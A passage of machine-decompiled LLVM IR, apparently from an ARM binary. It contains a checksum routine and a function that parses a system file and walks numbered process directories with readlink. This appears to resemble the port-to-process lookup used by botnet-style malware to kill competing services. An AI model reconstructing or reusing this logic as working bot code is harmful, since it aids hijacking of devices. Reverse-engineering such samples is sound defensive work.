  uselistorder i32 %v0_de1c, { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_de50(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_de50:
  %v3_de60 = urem i32 %arg2, 65536
  %v1_de64 = add i32 %arg1, 12
  %v1_de68 = inttoptr i32 %v1_de64 to i32*
  %v2_de68 = load i32, i32* %v1_de68, align 4
  %v3_de68 = add i32 %arg1, 16
  %v4_de68 = inttoptr i32 %v3_de68 to i32*
  %v5_de68 = load i32, i32* %v4_de68, align 4
  %v7_de6c = icmp sgt i32 %arg3, 1
  br i1 %v7_de6c, label %dec_label_pc_de78.preheader, label %dec_label_pc_de98

dec_label_pc_de78.preheader:                      ; preds = %dec_label_pc_de50
  %v0_de78.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_de78

dec_label_pc_de78:                                ; preds = %dec_label_pc_de78.preheader, %dec_label_pc_de78
  %v0_de8c = phi i32 [ 0, %dec_label_pc_de78.preheader ], [ %v2_de8c, %dec_label_pc_de78 ]
  %v0_de80 = phi i32 [ %arg3, %dec_label_pc_de78.preheader ], [ %v1_de80, %dec_label_pc_de78 ]
  %v0_de90 = phi i32 [ %v0_de78.pre, %dec_label_pc_de78.preheader ], [ %v1_de90, %dec_label_pc_de78 ]
  %v1_de78 = inttoptr i32 %v0_de90 to i8*
  %v2_de78 = load i8, i8* %v1_de78, align 1
  %v3_de78 = zext i8 %v2_de78 to i32
  %v1_de7c = add i32 %v0_de90, 1
  %v2_de7c = inttoptr i32 %v1_de7c to i8*
  %v3_de7c = load i8, i8* %v2_de7c, align 1
  %v4_de7c = zext i8 %v3_de7c to i32
  %v1_de80 = add nsw i32 %v0_de80, -2
  %v4_de84 = mul nuw nsw i32 %v4_de7c, 256
  %v5_de84 = or i32 %v4_de84, %v3_de78
  %v2_de8c = add i32 %v5_de84, %v0_de8c
  %v1_de90 = add i32 %v0_de90, 2
  store i32 %v1_de90, i32* @r1, align 4
  %v8_de94 = icmp sgt i32 %v1_de80, 1
  br i1 %v8_de94, label %dec_label_pc_de78, label %dec_label_pc_de98

dec_label_pc_de98:                                ; preds = %dec_label_pc_de78, %dec_label_pc_de50
  %v1_dea0 = phi i32 [ 0, %dec_label_pc_de50 ], [ %v2_de8c, %dec_label_pc_de78 ]
  %v0_de98 = phi i32 [ %arg3, %dec_label_pc_de50 ], [ %v1_de80, %dec_label_pc_de78 ]
  %v7_de98 = icmp eq i32 %v0_de98, 1
  br i1 %v7_de98, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_de98
  %v1_de9c = load i32, i32* @r1, align 4
  %v2_de9c = inttoptr i32 %v1_de9c to i8*
  %v3_de9c = load i8, i8* %v2_de9c, align 1
  %v4_de9c = zext i8 %v3_de9c to i32
  %v3_dea0 = add i32 %v4_de9c, %v1_dea0
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_de98, %bb
  %v0_dec4 = phi i32 [ %v1_dea0, %dec_label_pc_de98 ], [ %v3_dea0, %bb ]
  %v3_dea8 = urem i32 %v2_de68, 65536
  %v1_deb0 = add i32 %arg1, 9
  %v2_deb0 = inttoptr i32 %v1_deb0 to i8*
  %v3_deb0 = load i8, i8* %v2_deb0, align 1
  %v4_deb0 = zext i8 %v3_deb0 to i32
  %v3_deb4 = urem i32 %v5_de68, 65536
  %v4_deb8 = udiv i32 %v2_de68, 65536
  %v3_dec0 = mul nuw nsw i32 %v4_deb0, 256
  %v4_dec4 = udiv i32 %v5_de68, 65536
  %v5_dec4 = add i32 %v0_dec4, %v4_dec4
  %v2_dec8 = add i32 %v5_dec4, %v3_dec0
  %v5_deb8 = add nuw nsw i32 %v3_dea8, %v3_de60
  %v2_debc = add nuw nsw i32 %v5_deb8, %v4_deb8
  %v2_decc = add nuw nsw i32 %v2_debc, %v3_deb4
  %v2_ded0 = add i32 %v2_dec8, %v2_decc
  %tmp = icmp ult i32 %v2_ded0, 65536
  br i1 %tmp, label %dec_label_pc_def0, label %dec_label_pc_dedc

dec_label_pc_dedc:                                ; preds = %.thread, %dec_label_pc_dedc
  %v2_dee41 = phi i32 [ %v2_dee4, %dec_label_pc_dedc ], [ %v2_ded0, %.thread ]
  %v3_dee82.in = phi i32 [ %v2_dee4, %dec_label_pc_dedc ], [ %v2_ded0, %.thread ]
  %v3_dee82 = udiv i32 %v3_dee82.in, 65536
  %v3_dee0 = urem i32 %v2_dee41, 65536
  %v2_dee4 = add nuw nsw i32 %v3_dee0, %v3_dee82
  %tmp14 = icmp ult i32 %v2_dee4, 65536
  br i1 %tmp14, label %dec_label_pc_def0.loopexit, label %dec_label_pc_dedc

dec_label_pc_def0.loopexit:                       ; preds = %dec_label_pc_dedc
  br label %dec_label_pc_def0

dec_label_pc_def0:                                ; preds = %dec_label_pc_def0.loopexit, %.thread
  %v0_def0 = phi i32 [ %v2_dee4, %dec_label_pc_def0.loopexit ], [ %v2_ded0, %.thread ]
  %v1_def0 = urem i32 %v0_def0, 65536
  %v3_def8 = xor i32 %v1_def0, 65535
  ret i32 %v3_def8

; uselistorder directives
  uselistorder i32 %v2_dee4, { 2, 1, 3, 0 }
  uselistorder i32 %v2_ded0, { 3, 0, 2, 1 }
  uselistorder i32 %v1_dea0, { 1, 0 }
  uselistorder i32 %v1_de90, { 1, 0 }
  uselistorder i32 %v1_de80, { 0, 2, 1 }
  uselistorder i32 %v0_de90, { 0, 2, 1 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_dedc, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_de78, { 1, 0 }
}

define i32 @function_df00(i32 %arg1) local_unnamed_addr {
dec_label_pc_df00:
  %r4.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-68 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-581 = alloca i8, align 1
  %stack_var_-8773 = alloca i32, align 4
  %stack_var_-4677 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_df00 = load i32, i32* @r4, align 4
  store i32 %v3_df00, i32* %stack_var_-36, align 4
  %v6_df00 = load i32, i32* @r5, align 4
  %v9_df00 = load i32, i32* @r6, align 4
  %v12_df00 = load i32, i32* @r7, align 4
  %v15_df00 = load i32, i32* @r8, align 4
  %v21_df00 = load i32, i32* @sl, align 4
  %v2_df14 = ptrtoint i32* %stack_var_-4677 to i32
  store i32 %v2_df14, i32* @sl, align 4
  %v3_df1c = mul i32 %arg1, 65536
  store i32 %v3_df1c, i32* @r5, align 4
  %v2_df28 = ptrtoint i32* %stack_var_-8773 to i32
  %v4_df34 = call i32* @memset(i32* nonnull %stack_var_-4677, i32 0, i32 4096)
  %v0_df48 = load i32, i32* @r5, align 4
  %v3_df48 = udiv i32 %v0_df48, 65536
  store i32 %v3_df48, i32* %r4.global-to-local, align 4
  %v4_df4c = call i32* @memset(i32* nonnull %stack_var_-8773, i32 0, i32 4096)
  %v2_df50 = ptrtoint i8* %stack_var_-581 to i32
  store i32 %v2_df50, i32* @r6, align 4
  %v1_df58 = mul nuw nsw i32 %v3_df48, 256
  %v3_df64 = and i32 %v1_df58, 65280
  store i32 %v3_df64, i32* %r4.global-to-local, align 4
  %v2_df6c = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_df6c, i32* %sb.global-to-local, align 4
  %v3_df70 = bitcast i8* %stack_var_-581 to i32*
  %v4_df70 = call i32* @memset(i32* %v3_df70, i32 0, i32 513)
  %v2_df74 = ptrtoint i8* %stack_var_-68 to i32
  store i32 %v2_df74, i32* %sb.global-to-local, align 4
  %v0_df7c = load i32, i32* %r4.global-to-local, align 4
  %v1_df7c = load i32, i32* @r5, align 4
  %v4_df7c = udiv i32 %v1_df7c, 16777216
  %v5_df7c = or i32 %v4_df7c, %v0_df7c
  store i32 0, i32* @r4, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v3_df9c = trunc i32 %v5_df7c to i8
  %v4_df9c = call i32 @function_11bfc(i8 %v3_df9c, i32 16, i32 %v2_df74)
  %v2_dfa4 = call i32 @function_11798(i8* nonnull %stack_var_-68)
  %v7_dfa8 = icmp eq i32 %v2_dfa4, 2
  br i1 %v7_dfa8, label %dec_label_pc_e470, label %dec_label_pc_dfb0

dec_label_pc_dfb0:                                ; preds = %dec_label_pc_df00, %dec_label_pc_e470
  %v1_dfb4 = call i32 @function_1134c(i32 13)
  %v1_dfbc = call i32 @function_1134c(i32 14)
  %v1_dfc4 = call i32 @function_1134c(i32 15)
  %v1_dfcc = call i32 @function_1134c(i32 17)
  %v0_dfd0 = load i32, i32* @r4, align 4
  %v2_dfd8 = inttoptr i32 %v0_dfd0 to i32*
  %v3_dfd8 = call i32 @function_11268(i32 17, i32* %v2_dfd8)
  %v4_dfd8 = inttoptr i32 %v3_dfd8 to i8*
  %v0_dfdc = load i32, i32* @r4, align 4
  %v4_dfe0 = call i32 (i8*, i32, ...) @open(i8* %v4_dfd8, i32 %v0_dfdc)
  %v2_dfe4 = icmp eq i32 %v4_dfe0, -1
  store i32 %v4_dfe0, i32* @r8, align 4
  br i1 %v2_dfe4, label %dec_label_pc_e40c, label %dec_label_pc_dff0.preheader

dec_label_pc_dff0.preheader:                      ; preds = %dec_label_pc_dfb0
  %v4_dffc54 = call i32 @function_119f0(i32* %v3_df70, i32 512, i32 %v4_dfe0)
  %v2_e00056 = icmp eq i32 %v4_dffc54, 0
  br i1 %v2_e00056, label %dec_label_pc_e190.loopexit, label %dec_label_pc_e008.lr.ph

dec_label_pc_e008.lr.ph:                          ; preds = %dec_label_pc_dff0.preheader
  %v2_e050 = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_e008

dec_label_pc_e008:                                ; preds = %dec_label_pc_e008.lr.ph, %dec_label_pc_dff0.backedge
  %v3_e00c = load i8, i8* %stack_var_-581, align 1
  %v4_e00c = sext i8 %v3_e00c to i32
  %v2_e010 = icmp eq i8 %v3_e00c, 0
  br i1 %v2_e010, label %bb123, label %bb

bb:                                               ; preds = %dec_label_pc_e008
  %v8_e014 = icmp eq i8 %v3_e00c, 58
  br i1 %v8_e014, label %.thread6, label %dec_label_pc_e028

.thread6:                                         ; preds = %bb
  br label %dec_label_pc_e040

bb123:                                            ; preds = %dec_label_pc_e008
  br label %dec_label_pc_e040

dec_label_pc_e028:                                ; preds = %bb
  %v1_e030.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_e02c

dec_label_pc_e02c:                                ; preds = %bb124, %dec_label_pc_e028
  %v0_e02c = phi i32 [ %v1_e02c, %bb124 ], [ 0, %dec_label_pc_e028 ]
  %v1_e02c = add i32 %v0_e02c, 1
  %v2_e030 = add i32 %v1_e02c, %v1_e030.pre
  %v3_e030 = inttoptr i32 %v2_e030 to i8*
  %v4_e030 = load i8, i8* %v3_e030, align 1
  %v6_e030 = zext i8 %v4_e030 to i32
  %v2_e034 = icmp eq i8 %v4_e030, 0
  br i1 %v2_e034, label %dec_label_pc_e040, label %bb124

bb124:                                            ; preds = %dec_label_pc_e02c
  %v8_e038 = icmp eq i8 %v4_e030, 58
  br i1 %v8_e038, label %dec_label_pc_e040, label %dec_label_pc_e02c

dec_label_pc_e040:                                ; preds = %dec_label_pc_e02c, %bb124, %bb123, %.thread6
  %v1_e06c = phi i32 [ 0, %.thread6 ], [ 0, %bb123 ], [ %v1_e02c, %bb124 ], [ %v1_e02c, %dec_label_pc_e02c ]
  %v0_e040 = phi i32 [ %v4_e00c, %.thread6 ], [ %v4_e00c, %bb123 ], [ %v6_e030, %bb124 ], [ %v6_e030, %dec_label_pc_e02c ]
  %v2_e040 = icmp eq i32 %v0_e040, 0
  br i1 %v2_e040, label %dec_label_pc_dff0.backedge, label %dec_label_pc_e048

dec_label_pc_dff0.backedge:                       ; preds = %dec_label_pc_e040, %dec_label_pc_e118, %dec_label_pc_e164, %dec_label_pc_e08c
  %v0_dff8 = load i32, i32* @r8, align 4
  %v4_dffc = call i32 @function_119f0(i32* %v3_df70, i32 512, i32 %v0_dff8)
  %v2_e000 = icmp eq i32 %v4_dffc, 0
  br i1 %v2_e000, label %dec_label_pc_e190.loopexit, label %dec_label_pc_e008

dec_label_pc_e048:                                ; preds = %dec_label_pc_e040
  %v1_e04c = add i32 %v1_e06c, 2
  %v2_e054 = add i32 %v1_e04c, %v2_e050
  %v1_e058 = add i32 %v2_e054, -545
  %v2_e058 = inttoptr i32 %v1_e058 to i8*
  %v3_e058 = load i8, i8* %v2_e058, align 1
  %v2_e05c = icmp eq i8 %v3_e058, 0
  br i1 %v2_e05c, label %bb126, label %bb125

bb125:                                            ; preds = %dec_label_pc_e048
  %v8_e060 = icmp eq i8 %v3_e058, 32
  br i1 %v8_e060, label %.thread10, label %dec_label_pc_e06c

.thread10:                                        ; preds = %bb125
  store i32 %v1_e04c, i32* @r5, align 4
  br label %dec_label_pc_e08c

bb126:                                            ; preds = %dec_label_pc_e048
  store i32 %v1_e04c, i32* @r5, align 4
  br label %dec_label_pc_e08c

dec_label_pc_e06c:                                ; preds = %bb125
  %v0_e06c = load i32, i32* @r6, align 4
  %v2_e06c = add i32 %v0_e06c, %v1_e06c
  br label %dec_label_pc_e070

dec_label_pc_e070:                                ; preds = %bb127, %dec_label_pc_e06c
  %v0_e07c13 = phi i32 [ %v1_e07c, %bb127 ], [ %v2_e06c, %dec_label_pc_e06c ]
  %v1_e070 = add i32 %v0_e07c13, 3
  %v2_e070 = inttoptr i32 %v1_e070 to i8*
  %v3_e070 = load i8, i8* %v2_e070, align 1
  %v2_e074 = icmp eq i8 %v3_e070, 0
  br i1 %v2_e074, label %.thread12, label %bb127

.thread12:                                        ; preds = %dec_label_pc_e070
  %v1_e07c14 = add i32 %v0_e07c13, 1
  br label %dec_label_pc_e084

bb127:                                            ; preds = %dec_label_pc_e070
  %v8_e078 = icmp eq i8 %v3_e070, 32
  %v1_e07c = add i32 %v0_e07c13, 1
  br i1 %v8_e078, label %dec_label_pc_e084, label %dec_label_pc_e070

dec_label_pc_e084:                                ; preds = %bb127, %.thread12
  %v1_e07c15 = phi i32 [ %v1_e07c14, %.thread12 ], [ %v1_e07c, %bb127 ]
  %v2_e084 = sub i32 %v1_e07c15, %v0_e06c
  %v1_e088 = add i32 %v2_e084, 2
  store i32 %v1_e088, i32* @r5, align 4
  br label %dec_label_pc_e08c

dec_label_pc_e08c:                                ; preds = %bb126, %.thread10, %dec_label_pc_e084
  %v1_e098 = phi i32 [ %v1_e04c, %.thread10 ], [ %v1_e04c, %bb126 ], [ %v1_e088, %dec_label_pc_e084 ]
  %v0_e08c = load i32, i32* @r6, align 4
  %v2_e08c = add i32 %v0_e08c, %v1_e04c
  store i32 %v2_e08c, i32* @r4, align 4
  %v2_e098 = add i32 %v1_e098, %v2_e050
  store i32 0, i32* @r7, align 4
  %v3_e0a4 = add i32 %v2_e098, -545
  %v4_e0a4 = inttoptr i32 %v3_e0a4 to i8*
  store i8 0, i8* %v4_e0a4, align 1
  %v1_e0a8 = inttoptr i32 %v2_e08c to i8*
  %v2_e0a8 = call i32 @function_11798(i8* %v1_e0a8)
  store i32 %v2_e0a8, i32* @r1, align 4
  %v0_e0b4 = load i32, i32* @r4, align 4
  %v3_e0b8 = inttoptr i32 %v0_e0b4 to i8*
  %v4_e0b8 = call i32 @function_11aec(i8* %v3_e0b8, i32 %v2_e0a8, i32 %v2_df74)
  %v2_e0bc = icmp eq i32 %v4_e0b8, -1
  br i1 %v2_e0bc, label %dec_label_pc_dff0.backedge, label %dec_label_pc_e0d8.preheader

dec_label_pc_e0d8.preheader:                      ; preds = %dec_label_pc_e08c
  %v1_e0c0 = load i32, i32* @r7, align 4
  %v1_e0c4 = load i32, i32* @r6, align 4
  %v2_e0c4 = load i32, i32* @r5, align 4
  %v3_e0c4 = add i32 %v2_e0c4, %v1_e0c4
  store i32 %v1_e0c0, i32* @r4, align 4
  %v1_e0d846 = add i32 %v3_e0c4, 2
  %v2_e0d847 = inttoptr i32 %v1_e0d846 to i8*
  %v3_e0d848 = load i8, i8* %v2_e0d847, align 1
  %v2_e0dc50 = icmp eq i8 %v3_e0d848, 0
  %v1_e0e052 = add i32 %v2_e0c4, 2
  br i1 %v2_e0dc50, label %dec_label_pc_e118, label %dec_label_pc_e0e8

dec_label_pc_e0e8:                                ; preds = %dec_label_pc_e0d8.preheader, %dec_label_pc_e0d8.backedge
  %v0_e11882 = phi i32 [ %v0_e11881, %dec_label_pc_e0d8.backedge ], [ %v1_e0c0, %dec_label_pc_e0d8.preheader ]
  %v0_e100.pr = phi i32 [ %v0_e100.pr67, %dec_label_pc_e0d8.backedge ], [ %v1_e0c0, %dec_label_pc_e0d8.preheader ]
  %v0_e41c = phi i32 [ %v0_e41c70, %dec_label_pc_e0d8.backedge ], [ %v1_e0c0, %dec_label_pc_e0d8.preheader ]
  %v0_e0e078 = phi i32 [ %v1_e0e0, %dec_label_pc_e0d8.backedge ], [ %v1_e0e052, %dec_label_pc_e0d8.preheader ]
  %v0_e110 = phi i32 [ %v0_e0d8, %dec_label_pc_e0d8.backedge ], [ %v3_e0c4, %dec_label_pc_e0d8.preheader ]
  %v1_e0ec.in = phi i8 [ %v3_e0d8, %dec_label_pc_e0d8.backedge ], [ %v3_e0d848, %dec_label_pc_e0d8.preheader ]
  %v7_e0e8 = icmp eq i8 %v1_e0ec.in, 9
  br i1 %v7_e0e8, label %.thread23, label %bb128

bb128:                                            ; preds = %dec_label_pc_e0e8
  %v8_e0ec = icmp eq i8 %v1_e0ec.in, 32
  br i1 %v8_e0ec, label %.thread23.thread35, label %dec_label_pc_e100

.thread23.thread35:                               ; preds = %bb128
  br label %dec_label_pc_e10c

.thread23:                                        ; preds = %dec_label_pc_e0e8
  br label %dec_label_pc_e10c

dec_label_pc_e100:                                ; preds = %bb128
  %v7_e100 = icmp eq i32 %v0_e100.pr, 1
  br i1 %v7_e100, label %dec_label_pc_e41c, label %dec_label_pc_e108

dec_label_pc_e108:                                ; preds = %dec_label_pc_e41c, %dec_label_pc_e100
  %v0_e10c75 = phi i32 [ %v1_e41c, %dec_label_pc_e41c ], [ %v0_e41c, %dec_label_pc_e100 ]
  br label %dec_label_pc_e10c

dec_label_pc_e10c:                                ; preds = %.thread23, %.thread23.thread35, %dec_label_pc_e108
  %v0_e10c = phi i32 [ %v0_e41c, %.thread23.thread35 ], [ %v0_e41c, %.thread23 ], [ %v0_e10c75, %dec_label_pc_e108 ]
  %v0_e100.pr68 = phi i32 [ 1, %.thread23.thread35 ], [ 1, %.thread23 ], [ 0, %dec_label_pc_e108 ]
  %v7_e114 = icmp sgt i32 %v0_e10c, 6
  br i1 %v7_e114, label %dec_label_pc_e118, label %dec_label_pc_e0d8.backedge

dec_label_pc_e118:                                ; preds = %dec_label_pc_e0d8.backedge, %dec_label_pc_e10c, %dec_label_pc_e0d8.preheader
  %v1_e168 = phi i32 [ %v1_e0e052, %dec_label_pc_e0d8.preheader ], [ %v1_e0e0, %dec_label_pc_e0d8.backedge ], [ %v0_e0e078, %dec_label_pc_e10c ]
  %v0_e118 = phi i32 [ %v1_e0c0, %dec_label_pc_e0d8.preheader ], [ %v0_e11881, %dec_label_pc_e0d8.backedge ], [ %v0_e11882, %dec_label_pc_e10c ]
  %v2_e118 = icmp eq i32 %v0_e118, 0
  br i1 %v2_e118, label %dec_label_pc_dff0.backedge, label %dec_label_pc_e124

dec_label_pc_e124:                                ; preds = %dec_label_pc_e118
  %v2_e12c = add i32 %v1_e168, %v2_e050
  %v1_e130 = add i32 %v2_e12c, -545
  %v2_e130 = inttoptr i32 %v1_e130 to i8*
  %v3_e130 = load i8, i8* %v2_e130, align 1
  %v2_e134 = icmp eq i8 %v3_e130, 0
  br i1 %v2_e134, label %dec_label_pc_e164, label %bb129

bb129:                                            ; preds = %dec_label_pc_e124
  %v8_e138 = icmp eq i8 %v3_e130, 32
  br i1 %v8_e138, label %dec_label_pc_e164, label %dec_label_pc_e140

dec_label_pc_e140:                                ; preds = %bb129
  %v2_e140 = add i32 %v1_e168, %v1_e0c4
  br label %dec_label_pc_e144

dec_label_pc_e144:                                ; preds = %bb130, %dec_label_pc_e140
  %v0_e15028 = phi i32 [ %v1_e150, %bb130 ], [ %v1_e168, %dec_label_pc_e140 ]
  %v0_e144 = phi i32 [ %v1_e144, %bb130 ], [ %v2_e140, %dec_label_pc_e140 ]
  %v1_e144 = add i32 %v0_e144, 1
  %v2_e144 = inttoptr i32 %v1_e144 to i8*
  %v3_e144 = load i8, i8* %v2_e144, align 1
  %v2_e148 = icmp eq i8 %v3_e144, 0
  br i1 %v2_e148, label %.thread27, label %bb130

.thread27:                                        ; preds = %dec_label_pc_e144
  %v1_e15029 = add i32 %v0_e15028, 1
  br label %dec_label_pc_e158

bb130:                                            ; preds = %dec_label_pc_e144
  %v8_e14c = icmp eq i8 %v3_e144, 32
  %v1_e150 = add i32 %v0_e15028, 1
  br i1 %v8_e14c, label %dec_label_pc_e158, label %dec_label_pc_e144

dec_label_pc_e158:                                ; preds = %bb130, %.thread27
  %v1_e160 = phi i32 [ %v1_e15029, %.thread27 ], [ %v1_e150, %bb130 ]
  %v2_e160 = add i32 %v1_e160, %v2_e050
  br label %dec_label_pc_e164

dec_label_pc_e164:                                ; preds = %dec_label_pc_e124, %bb129, %dec_label_pc_e158
  %v2_e170 = phi i32 [ %v2_e12c, %dec_label_pc_e124 ], [ %v2_e12c, %bb129 ], [ %v2_e160, %dec_label_pc_e158 ]
  %v2_e168 = add i32 %v1_e168, %v1_e0c4
  store i32 %v2_e168, i32* @r4, align 4
  %v3_e170 = add i32 %v2_e170, -545
  %v4_e170 = inttoptr i32 %v3_e170 to i8*
  store i8 0, i8* %v4_e170, align 1
  %v1_e174 = inttoptr i32 %v2_e168 to i8*
  %v2_e174 = call i32 @function_11798(i8* %v1_e174)
  %v8_e17c = icmp sgt i32 %v2_e174, 15
  br i1 %v8_e17c, label %dec_label_pc_dff0.backedge, label %dec_label_pc_e180

dec_label_pc_e180:                                ; preds = %dec_label_pc_e164
  %v0_e184 = load i32, i32* @r4, align 4
  %v2_e188 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_e188, i32* @r0, align 4
  %v2_e18c = bitcast i32* %stack_var_-52 to i8*
  %v3_e18c = call i32 @function_117c0(i8* %v2_e18c, i32 %v0_e184)
  br label %dec_label_pc_e190

dec_label_pc_e190.loopexit:                       ; preds = %dec_label_pc_dff0.backedge, %dec_label_pc_dff0.preheader
  %.pre = ptrtoint i32* %stack_var_-52 to i32
  %.pre92 = bitcast i32* %stack_var_-52 to i8*
  br label %dec_label_pc_e190

dec_label_pc_e190:                                ; preds = %dec_label_pc_e190.loopexit, %dec_label_pc_e180
  %v1_e1a0.pre-phi = phi i8* [ %.pre92, %dec_label_pc_e190.loopexit ], [ %v2_e18c, %dec_label_pc_e180 ]
  %v2_e19c.pre-phi = phi i32 [ %.pre, %dec_label_pc_e190.loopexit ], [ %v2_e188, %dec_label_pc_e180 ]
  %v0_e190 = load i32, i32* @r8, align 4
  %v1_e194 = call i32 @close(i32 %v0_e190)
  %v2_e1a0 = call i32 @function_11798(i8* %v1_e1a0.pre-phi)
  store i32 %v2_e1a0, i32* @r4, align 4
  %v2_e1a4 = icmp eq i32 %v2_e1a0, 0
  br i1 %v2_e1a4, label %dec_label_pc_e44c, label %dec_label_pc_e1ac

dec_label_pc_e1ac:                                ; preds = %dec_label_pc_e190
  %v3_e1b4 = call i32 @function_11268(i32 13, i32* null)
  %v4_e1b4 = inttoptr i32 %v3_e1b4 to i8*
  %v3_e1b8 = call %__dirstream* @opendir(i8* %v4_e1b4)
  %v5_e1b8 = ptrtoint %__dirstream* %v3_e1b8 to i32
  store i32 %v5_e1b8, i32* @r8, align 4
  %v2_e1bc = icmp eq %__dirstream* %v3_e1b8, null
  br i1 %v2_e1bc, label %dec_label_pc_e3ec, label %dec_label_pc_e1cc.preheader

dec_label_pc_e1cc.preheader:                      ; preds = %dec_label_pc_e1ac
  store i32 0, i32* @r5, align 4
  %v3_e1d041 = call %dirent* @readdir(%__dirstream* nonnull %v3_e1b8)
  %v2_e1d444 = icmp eq %dirent* %v3_e1d041, null
  br i1 %v2_e1d444, label %dec_label_pc_e3e0, label %dec_label_pc_e1dc.preheader.lr.ph

dec_label_pc_e1dc.preheader.lr.ph:                ; preds = %dec_label_pc_e1cc.preheader
  %v2_e20c = bitcast i32* %stack_var_-4677 to i8*
  %tmp132 = bitcast i32* %stack_var_-8773 to i8*
  br label %dec_label_pc_e1dc.preheader

dec_label_pc_e1cc.loopexit:                       ; preds = %dec_label_pc_e1e4, %dec_label_pc_e1f8, %dec_label_pc_e260
  %v0_e1cc = load i32, i32* @r8, align 4
  %v1_e1cc = inttoptr i32 %v0_e1cc to %__dirstream*
  %v3_e1d0 = call %dirent* @readdir(%__dirstream* %v1_e1cc)
  %v2_e1d4 = icmp eq %dirent* %v3_e1d0, null
  br i1 %v2_e1d4, label %dec_label_pc_e3e0, label %dec_label_pc_e1dc.preheader

dec_label_pc_e1dc.preheader:                      ; preds = %dec_label_pc_e1dc.preheader.lr.ph, %dec_label_pc_e1cc.loopexit
  %v0_e1e490.in = phi %dirent* [ %v3_e1d041, %dec_label_pc_e1dc.preheader.lr.ph ], [ %v3_e1d0, %dec_label_pc_e1cc.loopexit ]
  br label %dec_label_pc_e1dc

dec_label_pc_e1dc:                                ; preds = %dec_label_pc_e1dc.preheader, %dec_label_pc_e3c8
  %v0_e1f0.in = phi %dirent* [ %v0_e1e490.in, %dec_label_pc_e1dc.preheader ], [ %v3_e3d4, %dec_label_pc_e3c8 ]
  %v0_e1dc = load i32, i32* @r5, align 4
  %v2_e1dc = icmp eq i32 %v0_e1dc, 0
  br i1 %v2_e1dc, label %dec_label_pc_e1e4, label %dec_label_pc_e3e0

dec_label_pc_e1e4:                                ; preds = %dec_label_pc_e1dc
  %v0_e1f0 = ptrtoint %dirent* %v0_e1f0.in to i32
  %v1_e1e4 = add i32 %v0_e1f0, 11
  %v2_e1e4 = inttoptr i32 %v1_e1e4 to i8*
  %v3_e1e4 = load i8, i8* %v2_e1e4, align 1
  %v4_e1e4 = zext i8 %v3_e1e4 to i32
  %v1_e1e8 = add nsw i32 %v4_e1e4, -48
  store i32 %v1_e1e4, i32* @r7, align 4
  %tmp = icmp ugt i32 %v1_e1e8, 9
  br i1 %tmp, label %dec_label_pc_e1cc.loopexit, label %dec_label_pc_e1f8

dec_label_pc_e1f8:                                ; preds = %dec_label_pc_e1e4
  %v3_e200 = call i32 @function_11268(i32 13, i32* null)
  store i32 %v2_df14, i32* @r0, align 4
  %v3_e20c = call i32 @function_117c0(i8* %v2_e20c, i32 %v3_e200)
  %v2_e214 = call i32 @function_11798(i8* %v2_e20c)
  %v0_e218 = load i32, i32* @r7, align 4
  %v0_e21c = load i32, i32* @sl, align 4
  %v2_e21c = add i32 %v0_e21c, %v2_e214
  store i32 %v2_e21c, i32* @r0, align 4
  %v2_e220 = inttoptr i32 %v2_e21c to i8*
  %v3_e220 = call i32 @function_117c0(i8* %v2_e220, i32 %v0_e218)
  %v2_e228 = call i32 @function_11798(i8* %v2_e20c)
  %v0_e22c = load i32, i32* @r5, align 4
  store i32 %v2_e228, i32* %r4.global-to-local, align 4
  %v2_e238 = inttoptr i32 %v0_e22c to i32*
  %v3_e238 = call i32 @function_11268(i32 14, i32* %v2_e238)
  %v0_e240 = load i32, i32* @sl, align 4
  %v2_e240 = add i32 %v2_e228, %v0_e240
  store i32 %v2_e240, i32* @r0, align 4
  %v2_e244 = inttoptr i32 %v2_e240 to i8*
  %v3_e244 = call i32 @function_117c0(i8* %v2_e244, i32 %v3_e238)
  %v7_e254 = call i32 @readlink(i8* %v2_e20c, i8* %tmp132, i32 4096)
  %v2_e258 = icmp eq i32 %v7_e254, -1
  br i1 %v2_e258, label %dec_label_pc_e1cc.loopexit, label %dec_label_pc_e260

dec_label_pc_e260:                                ; preds = %dec_label_pc_e1f8
  %v0_e260 = load i32, i32* @r5, align 4
  %v2_e268 = inttoptr i32 %v0_e260 to i32*
  %v3_e268 = call i32 @function_11268(i32 13, i32* %v2_e268)
  store i32 %v2_df14, i32* @r0, align 4
  %v3_e274 = call i32 @function_117c0(i8* %v2_e20c, i32 %v3_e268)
  %v2_e27c = call i32 @function_11798(i8* %v2_e20c)
  %v0_e280 = load i32, i32* @r7, align 4
  %v0_e284 = load i32, i32* @sl, align 4
  %v2_e284 = add i32 %v0_e284, %v2_e27c
  store i32 %v2_e284, i32* @r0, align 4
  %v2_e288 = inttoptr i32 %v2_e284 to i8*
  %v3_e288 = call i32 @function_117c0(i8* %v2_e288, i32 %v0_e280)
  %v2_e290 = call i32 @function_11798(i8* %v2_e20c)
  %v0_e294 = load i32, i32* @r5, align 4
  store i32 %v2_e290, i32* %r4.global-to-local, align 4
  %v2_e2a0 = inttoptr i32 %v0_e294 to i32*
  %v3_e2a0 = call i32 @function_11268(i32 15, i32* %v2_e2a0)
  %v0_e2a8 = load i32, i32* @sl, align 4
  %v2_e2a8 = add i32 %v2_e290, %v0_e2a8
  store i32 %v2_e2a8, i32* @r0, align 4
  %v2_e2ac = inttoptr i32 %v2_e2a8 to i8*
  %v3_e2ac = call i32 @function_117c0(i8* %v2_e2ac, i32 %v3_e2a0)
  %v3_e2b4 = call %__dirstream* @opendir(i8* %v2_e20c)
  %v5_e2b4 = ptrtoint %__dirstream* %v3_e2b4 to i32
  store i32 %v5_e2b4, i32* %sb.global-to-local, align 4
